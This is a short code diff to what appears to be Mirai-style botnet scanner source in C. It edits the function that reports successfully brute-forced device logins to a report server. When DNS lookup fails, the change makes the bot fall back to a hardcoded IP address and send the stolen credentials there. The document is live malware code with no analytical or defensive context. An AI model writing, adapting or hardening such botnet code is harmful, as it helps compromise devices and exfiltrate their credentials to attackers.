@@ -922,12 +922,16 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     if (entries == NULL)
     {
 #ifdef DEBUG
-        printf("[report] Failed to resolve report address\n");
+        printf("[report] Failed to resolve report address, using default ip: 192.168.222.103\n");
 #endif
-        return;
+        //return;
+        addr.sin_addr.s_addr = inet_addr("192.168.222.103");
     }
+    else{
+        addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    }
+
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
     resolv_entries_free(entries);
 
